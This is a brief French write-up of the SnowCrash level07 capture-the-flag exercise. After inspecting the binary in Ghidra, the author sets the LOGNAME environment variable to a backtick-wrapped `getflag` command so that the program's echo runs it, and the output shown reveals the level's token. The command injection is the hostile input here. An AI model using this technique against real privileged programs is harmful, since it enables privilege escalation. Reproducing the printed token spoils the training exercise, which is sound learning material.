si on ouvre l'executable sur ghidra:

![ghidra](./ghidra.png)

L'executable affiche dans le contenu de la variable d'environnement `LOGNAME` avec echo
nous pouvons dcp modifier l'env et faire passer notre executable

```bash
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
